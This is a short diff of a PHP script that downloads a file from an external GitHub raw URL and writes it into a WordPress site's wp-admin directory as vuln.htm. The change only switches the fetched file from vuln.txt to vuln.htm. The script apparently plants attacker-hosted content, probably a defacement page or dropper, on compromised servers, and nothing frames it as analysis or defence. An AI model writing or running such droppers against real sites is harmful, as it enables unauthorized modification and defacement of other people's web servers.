@@ -20,7 +20,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/vuln.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.htm');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
